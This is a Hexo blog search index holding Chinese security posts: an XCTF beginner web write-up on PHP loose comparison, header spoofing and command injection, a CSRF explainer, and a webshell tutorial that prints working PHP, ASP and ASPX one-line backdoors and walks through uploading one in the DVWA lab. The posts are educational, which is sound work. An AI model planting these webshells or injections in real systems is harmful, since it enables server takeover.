<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XCTF系列 // Web ez题 Writeup</title>
      <link href="/2020/07/11/XCTF%E7%B3%BB%E5%88%97-Web-ez%E9%A2%98-Writeup/"/>
      <url>/2020/07/11/XCTF%E7%B3%BB%E5%88%97-Web-ez%E9%A2%98-Writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>　　最近注册了攻防世界的账号，so 先把 WEB 的简单题做了熟悉一下平台操作，借此博客整理记录一下 EZ 题中相对较难的一些题目的题解和相关知识点。</p><h5 id="本文涉及的部分知识点：PHP弱类型比较、命令执行漏洞"><a href="#本文涉及的部分知识点：PHP弱类型比较、命令执行漏洞" class="headerlink" title="本文涉及的部分知识点：PHP弱类型比较、命令执行漏洞"></a>本文涉及的部分知识点：PHP弱类型比较、命令执行漏洞</h5><a id="more"></a><h3 id="1-robots"><a href="#1-robots" class="headerlink" title="1` robots"></a>1` robots</h3><p>　　robots 协议也叫 robots.txt 是一种存放于网站根目录下的ASCII编码的文本文件，它用来告知搜索引擎（或网络爬虫）哪些内容能被抓取，哪些内容不能被抓取。因为一些系统中的URL是大小写敏感的，所以 robots.txt 的文件名应统一为小写。<br>　　进入本题场景，网页中什么内容也没有，不过没有关系，既然题目为 robots ，故可以先访问 robots.txt 看看。</p><p><img src="https://img-blog.csdnimg.cn/20200708161959733.png" alt="在这里插入图片描述"><br>　　在该页面可以看到明显的提示，故直接访问 f1ag_1s_h3re.php 页面就可以得到flag。</p><h3 id="2-backup"><a href="#2-backup" class="headerlink" title="2` backup"></a>2` backup</h3><p>　　本题题目描述中给出了 “备份文件” 这个信息，由此想到相关后缀名应为.bak。既然题目要求访问 index.php 的备份文件，故访问 index.php.bak 浏览器即可下载得到该文件。用Sublime打开该文件，即可得到flag。</p><p><img src="https://img-blog.csdnimg.cn/20200708164328562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="3-weak-auth"><a href="#3-weak-auth" class="headerlink" title="3` weak_auth"></a>3` weak_auth</h3><p>　　打开本题网页，发现需要登录，在该页面没有发现什么线索，所以先随便输入一个账号密码试试。</p><p><img src="https://img-blog.csdnimg.cn/20200708171451704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>　　可以看到，网站弹出提示，要求我们使用 admin 的用户名来登录，同时我们可以查看该页面的源码，发现提示，建议使用字典来爆破密码。</p><p><img src="https://img-blog.csdnimg.cn/20200708171809337.png" alt="在这里插入图片描述"><br>　　因此，使用 Burpsuite 爆破密码即可得到 flag。（这题使用 Burpsuite 自带的字典不太好用。。。在这里贴一个还算比较全的字典吧：<a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a>）</p><p><img src="https://img-blog.csdnimg.cn/20200708172158906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="4-simple-php"><a href="#4-simple-php" class="headerlink" title="4` simple_php"></a>4` simple_php</h3><p>　　本题浏览源码可知，考察点在于 PHP 的弱类型比较。故按照题目要求，构造 a=a，b=1235a 即可得到flag。</p><h5 id="在这里总结记录一下碰到过的-PHP-弱类型比较。"><a href="#在这里总结记录一下碰到过的-PHP-弱类型比较。" class="headerlink" title="在这里总结记录一下碰到过的 PHP 弱类型比较。"></a>在这里总结记录一下碰到过的 PHP 弱类型比较。</h5><p>　　首先介绍一下相关概念，HTML 表单并不传递整数、浮点数或者布尔值，它们只传递字符串。要想检测一个字符串是不是数字，可以使用 is_numeric() 函数。在 PHP 中有两种比较是否相等的符号 == 与 === 。<br>　　等于 == ，当等号两边为相同类型时，直接比较值是否相等，当等号两边类型不同时，先转换为相同的类型，再对转换后的值进行比较。<br>　　全等 === ，在进行比较的时候，首先判断等号两边的类型是否相等，如果不同，则直接返回 false，如果相同，再进行比较值是否相等。<br>　　举一个简单的例子，变量a为数字1，变量b为字符’1’，在 PHP 中，$a == $b 会返回 true ，而 $a === $b 则会返回 false。<br>　<br>　　当字符串与数字比较时，首先将字符串转换为数字，不能转换为数字的字符串或 NULL ，被转换为0。例如， “abc” 是不能转换为数字的字符串，而 “123” 、”123a” 、”0x12” 或 “2e3” 是可以转换为数字的字符串。PHP 手册中相关描述如下：<br>　　<strong>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。</strong><br>　　一个字符串的开始部分决定了它转化成数值后的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。　<br>　　<strong>在进行比较运算时，如果遇到了 “ 0e\d+ “ 这种字符串，PHP 就会将这种字符串解析为科学计数法。</strong></p><table><thead><tr><th>例子</th><th>字符串转化后的数值</th><th>结果</th></tr></thead><tbody><tr><td>“admin”==0</td><td>0</td><td>true</td></tr><tr><td>“1admin”==1</td><td>1</td><td>true</td></tr><tr><td>“admin1”==1</td><td>0</td><td>false</td></tr><tr><td>“0e123456”==”0e456789”</td><td>0，字符串解析为科学计数法</td><td>true</td></tr><tr><td>“0e123456a”==”0e456789a”</td><td>字符串与字符串类型直接比较，无转换</td><td>false</td></tr><tr><td>“1e3b31”==1000</td><td>1000</td><td>true</td></tr><tr><td>“2e3”==2000</td><td>2000</td><td>true</td></tr><tr><td>“2E3”==2</td><td>2000</td><td>false</td></tr><tr><td>“0x12”==0</td><td>0</td><td>true</td></tr><tr><td>0x12==18</td><td>—</td><td>true</td></tr></tbody></table><p>　　MD5绕过就是以上知识的一种实际应用，举个例子，假如我们需要找到两个字符串，它们不相等，但是md5的值却 弱相等，这种字符串要怎么找呢，一种方法是我们只需要找到对应md5的值都以0e开头后接数字的两个字符串即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">md5(&quot;s878926199a&quot;)&#x3D;&#x3D;md5(&quot;s155964671a&quot;)为 true。</span><br><span class="line">md5(&quot;s878926199a&quot;)为 &quot;0e545993274517709034328855841020&quot;;</span><br><span class="line">md5(&quot;s155964671a&quot;)为 &quot;0e342768416822451524974117254469&quot;;</span><br><span class="line">两个字符串均为&quot;0e\d+&quot;格式，均被解析为科学计数法，数值都等于0。</span><br></pre></td></tr></table></figure><p>　　其它比较运算与等于类似，在这里附上 PHP 手册中相关内容的地址：<br>　　<a href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">PHP：PHP 类型比较表</a><br>　　<a href="https://www.php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="noopener">PHP：比较运算符</a></p><h3 id="5-xff-referer"><a href="#5-xff-referer" class="headerlink" title="5` xff_referer"></a>5` xff_referer</h3><p>　　根据题目信息可知，本题与 <em>X-Forwarded-For</em> 和 <em>Referer</em> 有关。进入网页，发现题目要求登录ip地址必须为123.123.123.123，于是使用 Burpsuite 进行抓包，在请求头添加一项 <code>X-Forwarded-For:123.123.123.123</code> 后重发，发现如下回显：</p><p><img src="https://img-blog.csdnimg.cn/20200709144513998.png" alt="在这里插入图片描述"><br>　　既然题目要求请求必须来自谷歌，于是再在请求头中添加一项 <code>referer:https://www.google.com</code> 后重发即可，在网页响应中即可看到 flag。</p><h6 id="X-Forwarded-For："><a href="#X-Forwarded-For：" class="headerlink" title="X-Forwarded-For："></a>X-Forwarded-For：</h6><p>简称XFF头，它代表客户端，也就是 HTTP 的请求端真实的IP，换句话说，XFF头就是告诉服务器当前请求者的IP地址的 HTTP 请求头字段。它的标准格式为 <em>X-Forwarded-For: client1, proxy1, proxy2</em> ，从标准格式可以看出，XFF头信息可以有多个，中间用逗号分隔，第一项为真实的客户端ip，剩下的就是曾经经过的代理或负载均衡的ip地址，经过几个就会出现几个。</p><h6 id="Referer："><a href="#Referer：" class="headerlink" title="Referer："></a>Referer：</h6><p>HTTP Referer是 header 的一部分，当浏览器向 WEB 服务器发送请求的时候，一般会带上 Referer ，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p><h3 id="6-command-execution"><a href="#6-command-execution" class="headerlink" title="6` command_execution"></a>6` command_execution</h3><p>　　本题的考察点为命令执行漏洞。当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如 PHP 中的 system、exec、shell_exec 等，当用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常命令中，造成命令执行攻击。<br>　　进入本题网页，首先试试输入127.0.0.1来观察一下回显。</p><p><img src="https://img-blog.csdnimg.cn/20200709234703159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>　　这里涉及到另外一个知识点，即如何从PING命令的回显来判断操作系统的类型。<strong>一般来说，我们可以通过查看TTL值从而判断操作系统类型</strong>。确定目标系统后，即可使用对应系统的相关系统命令来寻找 flag。</p><ul><li>TTL=128，这是 <em>WINNT/2K/XP</em>。</li><li>TTL=32，这是 <em>WIN95/98/ME</em>。</li><li>TTL=256，这是 <em>UNIX</em>。</li><li>TTL=64，这是 <em>LINUX</em>。</li></ul><p>　　本题目标系统为 LINUX，因此我们可以使用 LINUX 的查找命令以 flag 为关键词试试搜索相关文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -name &quot;flag*&quot;</span><br></pre></td></tr></table></figure><p><strong>关于 LINUX 的常用系统命令可参考以下博客</strong>：<a href="https://blog.csdn.net/qq_23853743/article/details/84037598" target="_blank" rel="noopener">Linux系统常用基本命令总结</a><br><strong>关于 WINDOWS 的常用系统命令可参考以下博客</strong>：<a href="https://blog.csdn.net/qq_23994787/article/details/79498299" target="_blank" rel="noopener">windows系统常用命令</a></p><p><img src="https://img-blog.csdnimg.cn/20200711121555691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>　　可以发现题目没有对用户输入的参数进行过滤，在回显中我们可以明显的看到 flag 文件的路径，接下来使用 cat 命令显示该文件内容即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p>　　本题题目把用户输入的参数不经过过滤直接放在 PING 命令之后，因此攻击者可以在输入的参数后用连接符截断再加上新的系统命令，进而执行该新命令。</p><p><strong>常见的 LINUX 命令间的连接符如下</strong>：</p><table><thead><tr><th>连接符</th><th>举例</th><th>效果</th></tr></thead><tbody><tr><td>;</td><td>A;B</td><td>按顺序依次执行，先执行命令A，再执行命令B</td></tr><tr><td>|</td><td>A|B</td><td>管道符，命令A执行成功后，命令A的输出会交给命令B继续处理。若命令A执行失败，则会报错，若命令B无法处理命令A的输出，也会报错。</td></tr><tr><td>&amp;&amp;</td><td>A&amp;&amp;B</td><td>逻辑与关系，命令A执行成功后，才会执行命令B；命令A执行失败，则命令B不被执行。</td></tr><tr><td>||</td><td>A||B</td><td>逻辑或关系，命令A执行失败后，才会执行命令B；命令A执行成功，则命令B不被执行</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web安全 // CSRF(跨站请求伪造)</title>
      <link href="/2020/06/17/Web%E5%AE%89%E5%85%A8-CSRF(%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)/"/>
      <url>/2020/06/17/Web%E5%AE%89%E5%85%A8-CSRF(%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>　　跨站请求伪造（Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，<strong>XSS 利用的是用户对指定网站的信任</strong>，<strong>CSRF 利用的是网站对用户网页浏览器的信任</strong>。</p><a id="more"></a><h2 id="二、用处"><a href="#二、用处" class="headerlink" title="二、用处"></a>二、用处</h2><p>　　简单来说，CSRF 攻击就是攻击者盗用了用户的身份，然后以用户的名义去发送恶意请求。CSRF 能够做许多事情，例如：以用户的名义发送邮件、发表博客、盗取账号甚至于购买商品、交易转账……</p><h2 id="三、攻击原理"><a href="#三、攻击原理" class="headerlink" title="三、攻击原理"></a>三、攻击原理</h2><p>　　我们知道，绝大多数网站都是通过 Cookie 等方式来辨识用户身份再予以授权的。因此攻击者可以利用用户在浏览器端保存的 Cookie 等认证信息，向相应的站点发送伪造请求，由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：<strong>简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</strong></p><p><img src="https://img-blog.csdnimg.cn/20200617210102529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200617210422319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="四、示例"><a href="#四、示例" class="headerlink" title="四、示例"></a>四、示例</h2><p>　　假如某论坛网站的发贴是通过 GET 请求访问，点击发表后 JS 把发贴内容拼接成目标 URL 并访问：</p><p><code>http://www.someforum.com/bbs/create_post.php?title=标题&amp;content=内容</code></p><p>　　那么攻击者可以在某网站中插入一个 HTML 的 img 标签如下：<br>　　<br><code>&lt;img src=http://www.someforum.com/bbs/create_post.php?title=暂时没想到什么花里胡哨的标题&amp;content=同上&gt;</code></p><p>　　当用户登录该论坛后，若又访问了攻击者的危险网站，那么用户的帐户就会在其不知情的情况下发表这一新帖子。<br>　　原因在于，当用户访问攻击者的危险网站时，浏览器在解析网页时会自动向 img 标签中的 src 属性中的地址发送请求。然而此时用户在论坛的登录信息仍保存在 cookie 中，其登录信息尚未过期，所以浏览器会带上登录信息去向论坛服务器请求，服务器在收到请求后根据 Cookie 判断此操作是用户所为，进而进行发表操作。<br>　　这种恶意的请求网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的是，<strong>欺骗用户浏览器，让其以用户的名义运行操作</strong>。　　</p><h2 id="五、防御手段"><a href="#五、防御手段" class="headerlink" title="五、防御手段"></a>五、防御手段</h2><p>　　虽然现实中很少有网站会使用GET请求来执行包含数据更改等敏感操作，但这并不意味着就可以避免 CSRF 攻击。CSRF 攻击可分为许多种类，按请求类型，可分为 GET 型和 POST 型；按攻击方式，可分为 HTML CSRF、JSON HiJacking、Flash CSRF 等。由于发起请求的方式多种多样，几乎没有彻底杜绝 CSRF 攻击的方式，但我们可以采取各种方式来提高攻击的门槛，例如：</p><h5 id="检查Referer字段"><a href="#检查Referer字段" class="headerlink" title="检查Referer字段"></a>检查Referer字段</h5><p>　　HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。</p><h5 id="添加校验token"><a href="#添加校验token" class="headerlink" title="添加校验token"></a>添加校验token</h5><p>　　由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再运行CSRF攻击。这种数据通常是窗体中的一个数据项。服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web安全 // 一句话木马</title>
      <link href="/2020/06/12/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
      <url>/2020/06/12/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>　　在介绍一句话木马之前，我们先来简单了解一下 <strong><em>WebShell</em></strong> 的相关概念。</p><a id="more"></a><p>　　Webshell 就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。<br>　　顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p><p>　　webshell 根据功能大致可分为大马、小马以及一句话木马。</p><blockquote><p><img src="https://img-blog.csdnimg.cn/20200612184915972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>　　顾名思义，一句话木马的代码极短，通常只有一句话。但这并不意味着它无关紧要，相反，它由于短小精悍，功能强大，隐蔽性非常好，在渗透入侵中始终扮演着强大的作用。常见的一句话木马有以下几种形式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php的一句话木马：</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">asp的一句话木马：</span><br><span class="line">&lt;%execute(request(<span class="string">"value"</span>))%&gt;</span><br><span class="line">aspx的一句话木马：</span><br><span class="line">&lt;%@ Page Language=<span class="string">"Jscript"</span>%&gt;    &lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">"value"</span>])%&gt;</span><br></pre></td></tr></table></figure><h2 id="二、基本原理"><a href="#二、基本原理" class="headerlink" title="二、基本原理"></a>二、基本原理</h2><p>　　我们以最简单普遍的一句话木马 <code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code> 为例，来分析其组成。<br>　　首先是 @ 符号，它在 PHP 中是一个错误控制运算符，当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都会被忽略掉。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果去掉了@符号，而又没有通过POST方法接收到pass变量</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">服务器就会报一个提醒，类似于：Notice: Undefined index: pass in ......</span><br><span class="line">原因在于我们使用了一个未定义的变量pass</span><br></pre></td></tr></table></figure><p>　　其次就是 eval() 函数，在 PHP 中 eval() 函数把字符串按照 PHP 代码来计算，该字符串必须是合法的 PHP 代码，且必须以分号结尾。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">示例一：</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="string">"echo 'a';"</span>); <span class="meta">?&gt;</span></span><br><span class="line">该语句等效于<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'a'</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">示例二：</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'pwd'</span>]); <span class="meta">?&gt;</span></span><br><span class="line">然后利用POST方法接受pwd变量，例如pwd=<span class="keyword">echo</span> <span class="string">'a'</span>;</span><br><span class="line">以上语句就等效为<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="string">"echo 'a';"</span>); <span class="meta">?&gt;</span></span><br><span class="line">即等效为<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'a'</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>　　该函数是整个一句话木马的核心所在，简单来说，就是我们想要执行什么代码，就把什么代码放进变量 pwd 中，然后利用 POST 方法传输给一句话木马即可执行。</p><h2 id="三、使用方法"><a href="#三、使用方法" class="headerlink" title="三、使用方法"></a>三、使用方法</h2><p>　　利用一句话木马结合 <strong><em>中国蚁剑</em></strong>、<strong><em>中国菜刀</em></strong> 等工具，通过 <strong><em>文件上传漏洞</em></strong> （文件上传漏洞是指由于服务器对于用户上传部分的控制不严格导致攻击者可以上传一个恶意的可执行的文件到服务器。简单点说，就是用户直接或者通过各种绕过方式将Webshell上传到服务器中进而执行利用）可以方便快捷的进行渗透。<br>　　简单来说只要攻击者满足以下三个条件，就能实现成功渗透：<br>① 木马上传成功，未被杀；<br>② 知道木马的路径在哪；<br>③ 上传的木马能正常运行。</p><h2 id="四、渗透测试"><a href="#四、渗透测试" class="headerlink" title="四、渗透测试"></a>四、渗透测试</h2><p>　　我们可以通过 <strong><em>DVWA</em></strong> 平台来进行一个简单的渗透试验。</p><h5 id="首先准备好我们的一句话木马文件"><a href="#首先准备好我们的一句话木马文件" class="headerlink" title="首先准备好我们的一句话木马文件"></a>首先准备好我们的一句话木马文件</h5><p><img src="https://img-blog.csdnimg.cn/20200612190003227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="然后进入-DVWA-平台，将其安全级别设置为LOW"><a href="#然后进入-DVWA-平台，将其安全级别设置为LOW" class="headerlink" title="然后进入 DVWA 平台，将其安全级别设置为LOW"></a>然后进入 DVWA 平台，将其安全级别设置为LOW</h5><p>然后我们可以先查看一下在此安全级别下，文件上传漏洞的后台源码</p><p><img src="https://img-blog.csdnimg.cn/20200612190339717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看出，在此安全级别下后台对上传的文件没有任何限制与验证，因此我们可以直接上传我们的 php 一句话木马文件</p><p><img src="https://img-blog.csdnimg.cn/20200612191032769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到文件上传成功后，平台会提示我们木马文件的保存路径，我们可以打开相关路径确认一下</p><p><img src="https://img-blog.csdnimg.cn/20200612191430687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="接下来我们可以借助中国蚁剑来进行连接"><a href="#接下来我们可以借助中国蚁剑来进行连接" class="headerlink" title="接下来我们可以借助中国蚁剑来进行连接"></a>接下来我们可以借助中国蚁剑来进行连接</h5><p>右键蚁剑空白处选择添加数据，然后填写好相关信息，连接密码为一句话木马中的变量名，URL 地址为网站的主路径然后加上上传文件时平台回显的文件保存路径</p><p><img src="https://img-blog.csdnimg.cn/20200612191900459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接成功后双击即可进入</p><p><img src="https://img-blog.csdnimg.cn/20200612192234704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200612192454904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到，我们现在可以通过木马对磁盘中的任何文件进行访问甚至进行增删改查！至此，渗透测试成功。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>使用 hexo + github 搭建免费个人博客教程</title>
      <link href="/2020/06/05/%E4%BD%BF%E7%94%A8-hexo-github-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/"/>
      <url>/2020/06/05/%E4%BD%BF%E7%94%A8-hexo-github-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>　　最近也没学啥新东西，恰巧看到学长在搭自己的博客，然后兴趣使来，就也想整一个简单的个人博客，然后由于种种原因，这个过程进行的并不是那么的顺利，于是就有了这篇博客，借此记录也希望观者能顺利的搭建属于自己的个人博客。<br>（PS：今天刚整明白搭博客，还没搞明白图片的插入以及美化排版啥的，先将就着看看hh）</p><a id="more"></a><h2 id="一、借助Github搭建博客"><a href="#一、借助Github搭建博客" class="headerlink" title="一、借助Github搭建博客"></a>一、借助Github搭建博客</h2><p>　　借助Github搭建博客有许多优点，<br>1.无需自己搭建服务器（零成本！）<br>2.可以绑定自己的域名（虽然不是广义上的私人订制）<br>3.使用标记语言，比如Markdown<br>　　当然由于是零成本、纯白嫖，肯定限制也是不少的，比如做出来的博客是静态网页，然后由于是基于GIT来对博客进行操作，很多东西都得靠命令来实现，但是总的来说用来搭建个人博客还是极好的选择。下面来正经介绍操作流程：<br>1.注册一个Github账号，这没啥好说的<br>2.创建一个仓库，仓库名为 你注册时的用户名（不是昵称）.github.io 